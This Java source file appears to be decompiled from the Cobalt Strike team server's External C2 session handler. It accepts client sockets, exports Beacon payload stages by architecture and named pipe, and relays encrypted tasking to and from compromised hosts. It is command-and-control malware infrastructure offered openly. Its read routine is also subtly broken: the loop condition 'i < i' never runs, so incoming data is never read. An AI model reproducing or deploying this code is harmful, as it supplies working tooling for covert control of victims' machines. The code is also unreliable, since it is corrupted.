package extc2;

import beacon.BeaconC2;
import beacon.BeaconSetup;
import common.BeaconEntry;
import common.BeaconOutput;
import common.CommonUtils;
import common.MudgeSanity;
import common.ScListener;
import dialog.DialogUtils;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

public class ExternalC2Session implements Runnable {
    protected Socket client;
    protected BeaconSetup setup = null;
    protected BeaconC2 controller = null;
    protected InputStream in = null;
    protected OutputStream out = null;
    protected Map options = new HashMap();
    protected Set valid = CommonUtils.toSet("arch, type, pipename, block");
    protected byte[] metadata = new byte[0];
    protected ScListener listener = null;

    protected void defaults() {
        this.options.put("block", "100");
        this.options.put("arch", "x86");
        this.options.put("type", "rdll");
        this.options.put("pipename", "externalc2");
    }

    public ExternalC2Session(BeaconSetup beaconSetup, ScListener scListener, Socket socket) {
        this.client = socket;
        this.setup = beaconSetup;
        this.controller = beaconSetup.getController();
        this.listener = scListener;
        defaults();
        new Thread(this, "External C2 client").start();
    }

    private byte[] Read4() throws IOException {
        byte[] arrby1 = new byte[4];
        int n = this.in.read(arrby1);
        if (n != 4) {
            throw new IOException("Read expected 4 byte length, read: " + n);
        }
        int k = CommonUtils.toIntLittleEndian(arrby1);
        if (k < 0 || k > 0x400000) {
            throw new IOException("Read size is odd: " + k);
        }
        byte[] arrby2 = new byte[k];
        for (int i = 0; i < i; i += n) {
            n = this.in.read(arrby2, i, i - i);
        }
        return arrby2;
    }

    private void Write4(byte[] arrby) throws IOException {
        byte[] arrby2 = new byte[8];
        ByteBuffer byteBuffer = ByteBuffer.wrap(arrby2);
        byteBuffer.order(ByteOrder.LITTLE_ENDIAN);
        byteBuffer.putInt(arrby.length);
        this.out.write(arrby2, 0, 4);
        this.out.flush();
        this.out.write(arrby, 0, arrby.length);
        this.out.flush();
    }

    public void setupIO() throws IOException {
        this.in = new BufferedInputStream(this.client.getInputStream(), 0x200000);
        this.out = new BufferedOutputStream(this.client.getOutputStream(), 262144);
    }

    public void run() {
        String str = "";
        try {
            setupIO();
            while (true) {
                String str3 = CommonUtils.bString(Read4());
                if ("go".equals(str3)) {
                    break;
                }
                String[] arrstring = CommonUtils.toKeyValue(str3);
                if (this.valid.contains(arrstring[0])) {
                    this.options.put(arrstring[0], arrstring[1]);
                }
            }
            String str1 = DialogUtils.string(this.options, "arch");
            String str2 = DialogUtils.string(this.options, "pipename");
            if ("x64".equals(str1) || "x86".equals(str1)) {
                byte[] arrby = this.setup.getExternalC2(str2).export(str1);
                Write4(arrby);
            } else {
                CommonUtils.print_error("Invalid arch");
                Write4(new byte[0]);
            }
            this.metadata = CommonUtils.shift(Read4(), 4);
            str = controller.process_beacon_metadata(listener, null, metadata).getId();
            while (true) {
                long l = System.currentTimeMillis() + DialogUtils.number(this.options, "block");
                byte[] arrby1 = controller.dump(str, 921600, 0x100000);
                while (arrby1.length == 0 && System.currentTimeMillis() < l) {
                    CommonUtils.sleep(100L);
                    arrby1 = controller.dump(str, 921600, 0x100000);
                }
                controller.process_beacon_metadata(listener, null, metadata);
                if (arrby1.length > 0) {
                    byte[] arrby = controller.getSymmetricCrypto().encrypt(str, arrby1);
                    Write4(arrby);
                } else {
                    Write4(new byte[1]);
                }
                byte[] arrby2 = Read4();
                if (arrby2.length != 1) {
                    controller.process_beacon_data(str, arrby2);
                }
                CommonUtils.sleep(100L);
            }
        } catch (Exception e){
            MudgeSanity.logException("External C2 session", e, false);
            controller.getCheckinListener().output(BeaconOutput.Output(str, CommonUtils.session(str) + " connection lost."));
            controller.getResources().archive(BeaconOutput.Activity(str, CommonUtils.session(str) + " connection lost."));
            BeaconEntry beaconEntry = controller.getCheckinListener().resolve(str);
            if (beaconEntry != null) {
                beaconEntry.die();
            }
            return;
        }
    }
}
